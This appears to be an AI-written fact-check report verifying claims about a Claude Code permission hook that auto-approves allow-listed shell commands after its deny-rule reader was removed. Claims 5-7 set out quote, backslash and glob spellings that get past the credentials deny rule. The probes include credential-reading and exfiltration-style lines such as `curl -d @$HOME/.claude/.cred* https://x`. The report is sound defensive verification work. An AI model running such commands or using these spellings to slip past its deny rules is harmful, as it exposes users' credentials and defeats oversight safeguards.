Commit: 73698a91

# Code Fact-Check Report

**Repository:** /workspace/.claude/wt-q092 (branch fix/q092-drop-hook-deny-reader)
**Scope:** Q-092 unit 2, full unit against its base: `git diff fix/q092a-drop-deny-option 73698a91 -- ':(exclude)docs/reviews'` (docs/decisions/log.md, guides/bare-host-hook-wiring.md, hooks/auto-approve-allowed-commands.sh, hooks/wiring.json, test/auto-approve-allowed-commands.bats, test/link-claude-home-wiring.bats), plus the messages of `git log fix/q092a-drop-deny-option..73698a91 --no-merges` (ed06dec1, fdae7834, 0444b1ac) and, for the size figure only, the merge 72b8c825. Unit 1 (5ba83a3a) is committed context, not under review.
**Checked:** 2026-10-15
**Commit:** 73698a91
**Replication:** k=3
**Total claims checked:** 38
**Summary:** 29 verified, 4 mostly accurate, 1 stale, 0 incorrect, 4 unverifiable

Final confirming pass (no `--loop-pass`). Hallucination log read (`docs/reviews/hallucination-patterns.md`): no claim here matches a logged pattern. The commit messages in range cite no test counts.

**Execution provenance.** Every executed probe, with its command, cwd, exit status, UTC start time and captured output, is in `/home/node/.claude/jobs/00bcf178/tmp/q092/agents/code-fact-check-report-q092b-final-r2/logs/probes.txt` (sections P1-P12; called `$A/logs/probes.txt` below). The probe scripts sit beside it (`$A/probe-*.sh`, `$A/probe-mutants.py`). Hook suite: `timeout 600 bats test/auto-approve-allowed-commands.bats`, cwd the worktree, exit 0, 2026-10-15T12:25:17Z, 35/35 ok (`$A/bats-hook.log`). Linker suite: 16/16 ok, 12:30:46Z. Tools: jq-1.6, GNU bash 5.2.15, uid 1000. Mutants ran on copies in mktemp dirs. All probes ran in the foreground under `timeout`, and none left a process behind.

---

## Claim 1: "the deny reader, `--deny` and the de-quoted matching are removed ... so each deny rule now has one interpreter, Claude Code's"

**Location:** `docs/decisions/log.md:76` (row 53, 2026-10-15 amendment); same claim at `hooks/auto-approve-allowed-commands.sh:63-65`, `hooks/wiring.json:43-44`, `test/link-claude-home-wiring.bats:267-269`, `test/auto-approve-allowed-commands.bats:116-117`
**Type:** Behavioral / Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook no longer reading, matching or acting on any deny rule from the settings files or a `--deny` argument at 73698a91. Does not establish anything about Claude Code's own matcher.

The jq program emits allow strings only. deny and ask are touched only by the shape check:

```jq
# hooks/auto-approve-allowed-commands.sh:161-166
    (["allow", "deny", "ask"][] as $k | select(has($k)) | .[$k]
     | if type != "array" then error("permissions.\($k) is not an array")
       elif any(.[]; type == "string" and test("\u0000"))
         then error("NUL inside a permissions.\($k) rule")
       else empty end),
    ((.allow // [])[] | select(type == "string"))
```

`main`'s argument loop has no `--deny` case: `*) shift ;;` (`hooks/auto-approve-allowed-commands.sh:290-292`). The only checks between `load_rules` and the decision are the empty-list, parse and per-command allow checks (`:315-371`, all read). An rg over the repo for `matches_deny|DENY_GLOBS|add_deny_rule` finds nothing outside docs/reviews and archive (paraphrased — no quote available because the claim is an absence of matches). Executed: with `Bash(*.credentials.json*)` and a bare `Bash` deny rule in the global file and `Bash(ls:*)` in the project deny list, the hook approves both `$PLAIN` and `ls -la` (test 10). P6 shows `cat ~/.claude/.credentials.json` under the credentials deny rule goes from prompt (pre-stack and unit 1) to allow at HEAD.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:152-169`, `hooks/auto-approve-allowed-commands.sh:278-374`, `test/auto-approve-allowed-commands.bats:172-188`, `$A/logs/probes.txt` (P1, P6)

---

## Claim 2: "The hook emits only `allow` or nothing (never `ask`, the decision #39344 shows overriding deny; a test pins its stdout)"

**Location:** `docs/decisions/log.md:76`; same claim at `guides/bare-host-hook-wiring.md:156`, `hooks/auto-approve-allowed-commands.sh:50-52` (the "never emits ask, deny or defer" part)
**Type:** Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's stdout on every exit path of `main` (`:278-374`) and the stdout test's power to catch an `ask`. Does not cover the exit-code wording in the header (Claim 13), the `parse_commands` CLI mode (`:826-870`, which the hook wiring never calls), or what #39344 shows (Claim 14).

The source spells one decision:

```bash
# hooks/auto-approve-allowed-commands.sh:366-373
  if $all_allowed; then
    debug "Decision: ALLOW (all commands passed)"
    echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}'
  else
    debug "Decision: BLOCK (falling through to normal permission check)"
  fi

  exit 0
```

Every other `main` exit is a bare `exit 0`: at `:299`, `:312`, `:322`, `:340` and `:352`, all read. `exit 2` appears only in `check_deps` (`:474`), which is called only from `parse_commands` (`:855`). Executed: P3 sends eight odd stdin shapes, and stdout is either empty or the allow JSON. P7 makes three `ask`-emitting mutants: a literal one, one spelled with `printf '%s'` so the static grep misses it, and one only on the malformed-settings path. The stdout test kills all three.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:278-374`, `hooks/auto-approve-allowed-commands.sh:466-476`, `hooks/auto-approve-allowed-commands.sh:855`, `test/auto-approve-allowed-commands.bats:147-170`, `$A/logs/probes.txt` (P3, P7)

---

## Claim 3: "The hook still fails closed on an unreadable or ill-shaped settings file, now also when `permissions` is present but not an object, or `permissions.allow`, `.deny` or `.ask` is present but not an array or holds a string with a NUL"

**Location:** `docs/decisions/log.md:76`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the listed fail-closed conditions at HEAD and how they compare with the unit-1 tip and pre-stack behaviour. Does not establish Claude Code's treatment of the same files.

Every listed condition fails closed at HEAD. P4 shows rc=5 with no output for `permissions` null and `[]`, and for allow, deny and ask each set to null, false, a string, an object, or an array holding a NUL string. The imprecision is "now also". P5 shows several listed cases already failed closed before unit 2. At 5ba83a3a and at pre-stack, `permissions: []`, an `allow` or `deny` given as a string or object, and a NUL in an `allow` or `deny` string all gave rc=5. The new cases are `permissions: null`, `allow`/`deny` given as null or false, and every malformed `ask`. A precise version would be: "...now also when `permissions` is null, `allow` or `deny` is null or false, or `ask` is present but not an array or holds a NUL string". This does not mislead anyone about current behaviour.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:157-167`, `$A/logs/probes.txt` (P4, P5)

---

## Claim 4a: "non-string entries are skipped"

**Location:** `docs/decisions/log.md:76`; same claim at `hooks/auto-approve-allowed-commands.sh:80-81`, `hooks/auto-approve-allowed-commands.sh:148`, `test/auto-approve-allowed-commands.bats:220`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook skipping non-string entries in allow, deny and ask at HEAD and the test's power to catch a regression in each list. Does not cover what Claude Code does with them (Claim 4b).

`((.allow // [])[] | select(type == "string"))` (`hooks/auto-approve-allowed-commands.sh:166`) skips non-strings in allow. The shape check at `:161-165` raises errors only for a non-array value or a NUL string. Executed: P4 `allow mixed non-string` (5, null, {}, ["a"], true around `"Bash(ls:*)"`) emits only `Bash(ls:*)`, and `allow [] + deny [1] + ask [{}]` gives rc=0. In P7, mutants that error on a non-string in deny, in ask or in allow are each killed by "non-string rule entries are skipped ...".

**Evidence:** `hooks/auto-approve-allowed-commands.sh:161-166`, `test/auto-approve-allowed-commands.bats:220-224`, `$A/logs/probes.txt` (P4, P7)

---

## Claim 4b: "as Claude Code drops them with a warning"

**Location:** `docs/decisions/log.md:76`; same claim at `hooks/auto-approve-allowed-commands.sh:80-81`, `hooks/auto-approve-allowed-commands.sh:148`, the title at `test/auto-approve-allowed-commands.bats:220`, and commit 0444b1ac ("matching Claude Code")
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** static
**Scope:** Covers only whether the repo can establish Claude Code's handling of non-string permission entries. Does not establish it either way.

This is a claim about Claude Code, not about code in this repo. 0444b1ac's own Notes say it was "read from the 2.1.300 binary, not run". Verifying it needs a Claude Code run with a settings file holding a non-string allow entry, observing the warning and that the file's other rules still apply. The sandbox has no host Claude Code session for that (paraphrased — no quote available because the subject is an external binary's runtime behaviour).

**Evidence:** commit 0444b1ac message (Notes), `hooks/auto-approve-allowed-commands.sh:80-81`

---

## Claim 5: "whether Claude Code's matcher catches a quote or backslash spelling (`.cred""entials.json`) or a denied subcommand in a list, which the hook used to send to the prompt"

**Location:** `docs/decisions/log.md:76`; same claim at `hooks/auto-approve-allowed-commands.sh:66-70`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers "the hook used to send [these] to the prompt" for the pre-stack hook (1a831ffe^) and that HEAD now approves them. Does not establish Claude Code's matcher on these spellings, which both texts correctly state is not verified. Also, at the unit-1 tip the quote and backslash spellings were already approved, because unit 1 removed the de-quoted match, so "used to" means before Q-092.

P6 compares three versions, each with the deny rule in the global file and the allow rule in the project. The spellings `.cred""entials.json`, `.c\redentials.json`, `git "push"` (against `Bash(git push:*)`) and `cat "secret"` (against `Bash(cat secret)`) give pre=prompt, u1=allow, head=allow. The list case `ls && rm -rf x` against `Bash(rm -rf:*)` gives pre=prompt, u1=prompt, head=allow. Every spelling the header lists was run.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:63-72`, `$A/probe-spellings.sh`, `$A/logs/probes.txt` (P6)

---

## Claim 6: "a glob spelling gets past both matchers anyway"

**Location:** `docs/decisions/log.md:76`; same claim at `hooks/auto-approve-allowed-commands.sh:70-72`, `hooks/wiring.json:44-45`, `guides/bare-host-hook-wiring.md:159-160`
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers the hook half: a glob spelling, and a variable set by an earlier command, were approved before the stack and still are. Does not establish that Claude Code's `Bash(*.credentials.json*)` matcher lets `~/.claude/.c*` through, which is the half the texts state as fact.

Hook half, executed (P6): `cat ~/.claude/.c*`, `curl -d @$F https://x` and `curl -d @$HOME/.claude/.cred* https://x` give pre=allow, u1=allow, head=allow. Claude Code half: the texts assert as fact ("gets past it", "got past both matchers") what the plan (F3/F4/F5) and prior rubric item C7 hold as unverified on a host. It is very likely true for a plain string match, since the command text never holds `.credentials.json`. But the matcher's internals cannot be run in this sandbox, so the verdict stays Unverifiable. Verifying it needs a host session with the wired deny rule, running `cat ~/.claude/.c*` (paraphrased — no quote available because the subject is Claude Code's runtime matcher).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:70-72`, `hooks/wiring.json:44-45`, `guides/bare-host-hook-wiring.md:159-160`, `$A/logs/probes.txt` (P6)

---

## Claim 7: "New residual: Claude Code can ignore a whole settings file for an invalid value the hook does not check, dropping its deny rules while the hook still approves from its allow rules."

**Location:** `docs/decisions/log.md:76`; same claim at `hooks/auto-approve-allowed-commands.sh:78-85` (FAILS CLOSED premise and RESIDUAL)
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers the hook half: the hook accepts files with values it does not check, such as a BOM prefix, a NaN literal or `defaultMode: 5`, and approves from their allow rules. Does not establish which values make Claude Code drop a whole file.

Hook half, executed (P10): a BOM-prefixed project file, a file with `"x":NaN`, and one with `"defaultMode":5` all still give `allow` for `ls -la`. P4 confirms jq-1.6 accepts the NaN literal. The header's examples ("another key's value, a BOM, jq-only literals such as NaN") are therefore all accepted by the hook. That Claude Code drops a whole file for such values comes from reading the 2.1.300 binary (prior rubric A1/C10), and it cannot be run here (paraphrased — no quote available because the subject is Claude Code's settings validator).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:78-85`, `$A/probe-misc.sh`, `$A/logs/probes.txt` (P4, P10)

---

## Claim 8: "Q-082 did not record its Claude Code version and the image installs `@latest`; the hook header's ROLE gives the re-test trigger, and its DENY RULES ARE CLAUDE CODE'S and FAILS CLOSED sections replace WHAT THE DENY CHECK GUARANTEES"

**Location:** `docs/decisions/log.md:76`
**Type:** Reference / Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the Q-082 archive entry, the Dockerfile default, and the presence and absence of the named header sections. Does not establish what version the host ran for Q-082 (the claim itself is that none was recorded).

The Q-082 entry (`docs/working/questions-archive.md:1693-1720`, read in full) names no Claude Code version. `ARG CLAUDE_CODE_VERSION=latest` (`devcontainer-config/Dockerfile:19`) feeds `npm install -g @anthropic-ai/claude-code@${CLAUDE_CODE_VERSION}` (`:403`). ROLE carries "re-run Q-082's test when a Claude Code release changes how a PreToolUse permissionDecision combines with permission rules" (`hooks/auto-approve-allowed-commands.sh:57-58`). The header has `# DENY RULES ARE CLAUDE CODE'S (Q-092).` at `:63` and `# FAILS CLOSED on its inputs` at `:74`. `WHAT THE DENY CHECK GUARANTEES` occurs nowhere in the hook (paraphrased — no quote available because that part is an absence of matches).

**Evidence:** `docs/working/questions-archive.md:1693-1720`, `devcontainer-config/Dockerfile:19`, `devcontainer-config/Dockerfile:403`, `hooks/auto-approve-allowed-commands.sh:50-85`

---

## Claim 9: "The sandbox half of Q-070 [1] is not built: it needs image and runArgs changes that are open as a follow-up question (Q-081)."

**Location:** `docs/decisions/log.md:76` (last sentence of row 53's Decision cell)
**Type:** Reference
**Verdict:** Stale
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the Q-081 status and whether its follow-up is built. Does not judge whether the sentence belongs to this unit: it predates unit 2, which moved it to the row's end unchanged.

Q-081 is archived as answered: "**Status:** ANSWERED ... **Answered 2026-09-28: [2] spike `enableWeakerNestedSandbox` first.** Filed as Q-088" (`docs/working/questions-archive.md:1597-1599`). The live follow-up is Q-125 (`docs/working/questions.md:455-470`), which records the sandbox as "built, unmerged, in two stacked units". "Not built" still holds on this branch: `devcontainer-config/Dockerfile` has no `bubblewrap` (paraphrased — no quote available because that part is an absence of matches). The pointer is the stale part. The open question is Q-125, not Q-081, which is how the hook header already cites it: "cc-isolated has no sandbox (Q-081, Q-125)" (`hooks/auto-approve-allowed-commands.sh:59`).

**Evidence:** `docs/working/questions-archive.md:1596-1599`, `docs/working/questions.md:455-470`, `hooks/auto-approve-allowed-commands.sh:59`

---

## Claim 10: "Claude Code applies `permissions.deny` even after a hook `allow` (host test Q-082), so the credentials backstop is the `Bash(*.credentials.json*)` deny rule alone where no sandbox runs (cc-isolated has none)."

**Location:** `guides/bare-host-hook-wiring.md:156-159`; same claim at `hooks/wiring.json:42-44`, `test/link-claude-home-wiring.bats:267-269`
**Type:** Reference / Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers what Q-082 recorded, that cc-isolated has no sandbox on this branch, and that the linker still merges the rule. Does not establish the precedence for Claude Code versions other than the one Q-082 ran. Q-082 also used an always-allow test hook and a canary rule in settings.local.json, not this hook and the global credentials rule; the hook's JSON differs from Q-082's only by the missing `permissionDecisionReason`.

Q-082 records: "the user confirmed `/hooks` listed the test hook. So a PreToolUse hook `allow` does **not** override a matching `permissions.deny` rule" (`docs/working/questions-archive.md:1716`). There is no `bubblewrap` in the Dockerfile on this branch (Claim 9). The linker test "the merged settings carry the Bash deny rule for the credentials file (Q-077)" passes (P2, 16/16). wiring.json is valid JSON, and its diff changes only `_comment` lines.

**Evidence:** `docs/working/questions-archive.md:1693-1720`, `test/link-claude-home-wiring.bats:265-275`, `hooks/wiring.json:39-46`, `$A/logs/probes.txt` (P2)

---

## Claim 11: "The hook header's DENY RULES ARE CLAUDE CODE'S and RULE SYNTAX sections say what is left."

**Location:** `guides/bare-host-hook-wiring.md:160-161`
**Type:** Reference
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** static
**Scope:** Covers what the two named sections contain. Does not judge the rest of the guide paragraph.

The sentence follows the backstop's residual ("a spelling without the literal name ... gets past it"), so "what is left" reads as what the deny backstop leaves uncovered. DENY RULES ARE CLAUDE CODE'S (`hooks/auto-approve-allowed-commands.sh:63-72`) says that. RULE SYNTAX, since this unit, is allow-only: "An allow rule is a literal command prefix:" followed by four allow rows (`:95-104`). It says nothing about deny rules or what they leave. Before this unit, RULE SYNTAX held the allow-vs-deny table, so the pointer was right then. Precise version: "The hook header's DENY RULES ARE CLAUDE CODE'S section says what is left" (keep RULE SYNTAX only as the pointer for allow-rule matching).

**Evidence:** `guides/bare-host-hook-wiring.md:156-161`, `hooks/auto-approve-allowed-commands.sh:63-72`, `hooks/auto-approve-allowed-commands.sh:95-104`

---

## Claim 12: "Dynamically reads allow rules from (SETTINGS SOURCES below)" / SETTINGS SOURCES: "an empty value falls back; a relative value approves nothing ... (the cwd's .claude/ outside a repo). One jq call reads all of them (SETTINGS_RULES_JQ). --permissions replaces all three. Managed settings and --settings files are not read"

**Location:** `hooks/auto-approve-allowed-commands.sh:4`, `hooks/auto-approve-allowed-commands.sh:15`, `hooks/auto-approve-allowed-commands.sh:87-93`
**Type:** Configuration / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the file list, the CLAUDE_CONFIG_DIR handling, the single jq call and the `--permissions` branch. Does not establish which settings sources Claude Code itself honours.

```bash
# hooks/auto-approve-allowed-commands.sh:135-137
  root=$(git rev-parse --show-toplevel 2>/dev/null) || root=""
  printf '%s\0' "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json" \
    "${root:-.}/.claude/settings.json" "${root:-.}/.claude/settings.local.json"
```

`read_settings_rules` returns 1 for a relative CLAUDE_CONFIG_DIR (`:179-182`) and makes one `jq -nj "$SETTINGS_RULES_JQ" ...` call (`:199`). `load_rules` reads `$CUSTOM_PERMISSIONS` in the `if` branch and calls `read_settings_rules` only in the `else` branch (`:235-246`, read in full). Tests 16-18 (CLAUDE_CONFIG_DIR, empty fallback, relative, newline) pass in P1.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:133-138`, `hooks/auto-approve-allowed-commands.sh:173-200`, `hooks/auto-approve-allowed-commands.sh:232-248`, `test/auto-approve-allowed-commands.bats:237-276`, `$A/logs/probes.txt` (P1)

---

## Claim 13: "The hook emits one decision, "allow", or nothing (exit 0 with no output, so Claude Code's own rules and prompt decide)."

**Location:** `hooks/auto-approve-allowed-commands.sh:50-52`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the exit status attached to "nothing" on `main`'s paths. Does not reopen the stdout invariant (Claim 2), which holds.

"Nothing" is not always exit 0. Under `set -euo pipefail` (`:106`), stdin that is not a JSON object aborts at `command=$(echo "$input" | jq -r '.tool_input.command // empty')` (`:305`) with jq's status. P3 gives `not json` rc=4, `{"tool_input":"x"}` rc=5 and `[]` rc=5, each with empty stdout and jq's message on stderr. None of these is 2, Claude Code's blocking code, and Claude Code does not send such stdin. Practically the claim holds. Precise version: "...or nothing (no output; exit 0 on every input Claude Code sends)".

**Evidence:** `hooks/auto-approve-allowed-commands.sh:106`, `hooks/auto-approve-allowed-commands.sh:302-313`, `$A/logs/probes.txt` (P3)

---

## Claim 14: "a hook "ask" overrides permissions.deny (Claude Code issue #39344)"

**Location:** `hooks/auto-approve-allowed-commands.sh:53-54`; same reference at `docs/decisions/log.md:76`, `test/auto-approve-allowed-commands.bats:116`
**Type:** Reference
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** static
**Scope:** Covers only whether the issue's content can be checked from here. Does not establish the issue's content.

The sandbox has no egress (WebFetch fails), so the issue cannot be opened. The repo cites it consistently for the same behaviour: wiring.json says "a hook 'ask' would silently override permissions.deny (Claude Code issue #39344)" (`hooks/wiring.json:34-35`). Verifying it needs the issue page, or a host run with a hook returning `ask` next to a matching deny rule.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:53-54`, `hooks/wiring.json:33-37`

---

## Claim 15: "Q-082 did not record the Claude Code version (Q-091 saw 2.1.284 on the host that day) and the image installs @latest"

**Location:** `hooks/auto-approve-allowed-commands.sh:55-57`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the two archive entries and the Dockerfile default. Does not establish that Q-082's session ran 2.1.284; the text claims only what Q-091 saw.

Q-082 names no version (Claim 8). Q-091's answer, dated 2026-09-28 like Q-082's, says the user's command "printed `2.1.284 (Claude Code)`" (`docs/working/questions-archive.md`, Q-091 entry from `:1722`). The Dockerfile default is `latest` (`devcontainer-config/Dockerfile:19`).

**Evidence:** `docs/working/questions-archive.md:1693-1760`, `devcontainer-config/Dockerfile:19`

---

## Claim 16: "cc-isolated has no sandbox (Q-081, Q-125), so there the shape allowlist above still decides which allow-listed commands run without a prompt."

**Location:** `hooks/auto-approve-allowed-commands.sh:59-61`
**Type:** Architectural / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers this branch's image (no bwrap) and Q-125's status. Does not cover the unmerged Q-125 branches.

There is no `bubblewrap` or `seccomp` in `devcontainer-config/Dockerfile` or `devcontainer.json` on this branch (paraphrased — no quote available because the claim is an absence of matches). Q-125 is `**Status:** OPEN`, and the sandbox is "built, unmerged" (`docs/working/questions.md:455-466`).

**Evidence:** `docs/working/questions.md:455-470`, `devcontainer-config/Dockerfile`

---

## Claim 17: "FAILS CLOSED on its inputs: if any settings file below exists but cannot be read, does not hold exactly one JSON object, or has a permissions that is not an object, or a permissions.allow, .deny or .ask (present at all) that is not an array or holds a string with a NUL, no command is approved on that call."

**Location:** `hooks/auto-approve-allowed-commands.sh:74-77`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers every listed condition on jq-1.6, end to end through the hook for the unreadable, directory and wrong-shape cases, and the error path from jq to an empty ALLOW_PREFIXES. Does not cover files Claude Code rejects for other reasons (Claim 7) or the FIFO case (an inherited Won't-Fix, #128).

The error path runs from a jq `error(...)` to the jq status, to `wait $!` failing in `load_rules` (`:241-245`, `return 0` before the loop at `:247`), to an empty `ALLOW_PREFIXES`, to `exit 0` with no output (`:320-323`). P4 gives rc=5 with no output for permissions null and `[]`, for each of allow, deny and ask set to null, false, a string, an object or a NUL string, for an empty file, for `{}{}` and for a top-level array. permissions absent, `{}` and the three keys absent all give rc=0. P10 shows an unreadable file (mode 000, uid 1000) and a directory at the settings path both prompt. Test 13's loop passes, and five shape mutants (P7) are killed.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:152-169`, `hooks/auto-approve-allowed-commands.sh:232-248`, `hooks/auto-approve-allowed-commands.sh:315-323`, `$A/logs/probes.txt` (P4, P7, P10)

---

## Claim 18: "deny and ask are shape-checked, never read"

**Location:** `hooks/auto-approve-allowed-commands.sh:78`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers what the jq program emits. Does not cover the stated rationale (Claude Code's whole-file drop, Claim 7).

The only emitting expression is `((.allow // [])[] | select(type == "string"))` (`:166`). The deny and ask branch ends in `else empty end` (`:165`). P4's `deny absent` and `ask absent` rows emit only the allow rule, and no row emits a deny or ask string.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:161-167`, `$A/logs/probes.txt` (P4)

---

## Claim 19: RULE SYNTAX table, including "Bash(ls *)   literal prefix, not a glob: `ls *` and `ls * -la` (bash then expands that `*`), never `ls -la` (use `Bash(ls:*)`)"

**Location:** `hooks/auto-approve-allowed-commands.sh:95-104`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers every row against the hook through `--permissions` (the same parser and matcher as the settings path). Does not establish Claude Code's own reading of these rules.

P9: `Bash(ls)` allows `ls` and `ls -la` and prompts on `ls/x`. `Bash(a/b)` allows `a/b/x`, and `Bash(python3 d)` allows `python3 d/x`. `Bash(rm:*)` allows `rm` and `rm x` and prompts on `rmdir x`. `Bash(ls *)` allows `ls *` and `ls * -la` and prompts on `ls -la`. A bare `Bash` prompts. `Bash(ls` (no closing paren) and `Read(ls)` prompt, so neither counts as a Bash rule. The matcher is `[[ "$full_command" == "$allowed" ]] || [[ "$full_command" == "$allowed "* ]] || { [[ "$allowed" == *[\ /]* ]] && [[ "$full_command" == "$allowed/"* ]]; }` (`:267-268`; `is_command_allowed` `:253-276` read in full). Tests 22-25 and 32 pass.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:95-104`, `hooks/auto-approve-allowed-commands.sh:253-276`, `test/auto-approve-allowed-commands.bats:310-334`, `$A/logs/probes.txt` (P9)

---

## Claim 20: "The global path is resolved exactly as devcontainer-config/link-claude-home.sh resolves DEST, so the file the linker merges into is the one read here."

**Location:** `hooks/auto-approve-allowed-commands.sh:129-132`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the expansion of the directory. Does not cover the hook's extra relative-value refusal, which the linker lacks and the header states separately.

The linker has `DEST="${CLAUDE_CONFIG_DIR:-$HOME/.claude}"` (`devcontainer-config/link-claude-home.sh:36`). The hook has `"${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json"` (`hooks/auto-approve-allowed-commands.sh:136`).

**Evidence:** `devcontainer-config/link-claude-home.sh:36`, `hooks/auto-approve-allowed-commands.sh:136`

---

## Claim 21: SETTINGS_RULES_JQ comment: "permissions.allow, .deny and .ask, when present (even as null or false), must each be an array, and no string in them may hold a NUL ... Only allow is emitted ... test("\u0000"), not contains(): jq 1.6's contains() matches a NUL needle against every string."

**Location:** `hooks/auto-approve-allowed-commands.sh:140-151`
**Type:** Behavioral / Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the comment's statements about the program on jq-1.6, including the one-document-per-file check and NUL-terminated output. Does not cover other jq versions.

P4 on jq-1.6: `"abc" | contains("\u0000")` gives `true`, and `"abc" | test("\u0000")` gives `false`. The comment's contains() note is therefore correct for this jq. A P7 mutant that swaps `test` for `contains` is killed: the non-string test fails because every allow string then trips the NUL error. The null and false cases, empty-file and `{}{}` errors, and allow-only emission are as in Claims 17-18. Records are terminated by `| . + "\u0000"` (`:168`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:140-169`, `$A/logs/probes.txt` (P4, P7)

---

## Claim 22: "The parser for `Bash(...)` rule strings. Sets RULE_BARE ... and RULE_BODY (the text inside the parens, with a trailing legacy `:*` removed). Returns 1 for anything that is not a Bash rule."

**Location:** `hooks/auto-approve-allowed-commands.sh:202-204`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers parse_bash_rule after RULE_LEGACY's removal, and that nothing still reads RULE_LEGACY. Does not cover body semantics beyond the table (Claim 19).

```bash
# hooks/auto-approve-allowed-commands.sh:205-217
parse_bash_rule() {
  local rule="$1"
  RULE_BARE=false RULE_BODY=""
  if [[ "$rule" == "Bash" ]]; then
    RULE_BARE=true
    return 0
  fi
  [[ "$rule" == "Bash("*")" ]] || return 1
  RULE_BODY=${rule#Bash\(}
  RULE_BODY=${RULE_BODY%\)}
  RULE_BODY=${RULE_BODY%:\*}
  return 0
}
```

`${RULE_BODY%:\*}` strips one trailing `:*` and is a no-op otherwise, the same as the removed `if [[ ... == *":*" ]]` form. `RULE_LEGACY` has no remaining reference in the hook (paraphrased — no quote available because that part is an absence of matches). P9's `Bash(ls:*:*)` leaves body `ls:*`, which prompts on `ls -la`, consistent with stripping only one suffix.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:205-225`, `$A/logs/probes.txt` (P9)

---

## Claim 23: "On failure no rule is kept, not even the records jq printed before its error."

**Location:** `hooks/auto-approve-allowed-commands.sh:230-231` (load_rules comment); related `:125-126`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers load_rules discarding jq's partial output when a later file fails. Does not establish test coverage of this property: no test pins it, and a mutant that keeps the partial records survives the whole suite.

```bash
# hooks/auto-approve-allowed-commands.sh:241-247
    mapfile -d '' records < <(read_settings_rules)
    if ! wait $!; then
      debug "A settings file could not be read or parsed: approving nothing"
      return 0
    fi
  fi
  for rec in "${records[@]}"; do add_allow_rule "$rec"; done
```

P4 `good then bad file`: jq prints `Bash(ls:*)` and then fails with rc=5, so partial output is real. P8 runs a global allow file followed by a project file with `deny: "x"`, `ask: [1, "a\u0000b"]` or `permissions: null`: HEAD prompts all three, and a mutant without the `return 0` approves all three. That mutant passes all 35 tests (P8 `mutant full-suite bats rc=0`). Every fail-closed test puts the bad file in the global slot, so jq stops before printing any record from a later good file.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:232-248`, `test/auto-approve-allowed-commands.bats:193-233`, `$A/probe-partial.sh`, `$A/logs/probes.txt` (P4, P8)

---

## Claim 24: Stdout test: "Stdout alone (stderr dropped), over main's exit paths for approved, refused, unparseable, unlisted, empty and malformed input (the jq-missing exit is not reached). Statically: the source spells exactly one decision."

**Location:** `test/auto-approve-allowed-commands.bats:147-170`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the comment's description of the inputs and the test's power to kill an `ask` on the refused path or the malformed-settings path, even one hidden from the grep. Does not cover the jq-missing exit, which the comment itself excludes.

The loop's inputs map to main's exits. `ls -la` and the credentials `cat` are approved. `ls $(pwd)` and `$REPRO` are refused shapes. `ls (` is unparseable. `python3 x` is unlisted. `''` is empty, and `# comment` extracts to nothing. The tail covers a malformed settings file, `{}` and non-JSON stdin. The static check is `grep -o '"permissionDecision":"[a-z]*"' "$HOOK" | sort -u` (`:153`). P7 kills three `ask` mutants, including the one spelled with `printf '%s'` that the grep cannot see.

**Evidence:** `test/auto-approve-allowed-commands.bats:147-170`, `$A/logs/probes.txt` (P7)

---

## Claim 25: "deny rules in the settings files no longer change the hook's decision (Q-092)"

**Location:** `test/auto-approve-allowed-commands.bats:172-182`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the title against its assertions and four deny-reintroducing mutants. The comment's second half ("Claude Code's deny rule still denies") is context about Claude Code, Claim 10's subject, and is not asserted here.

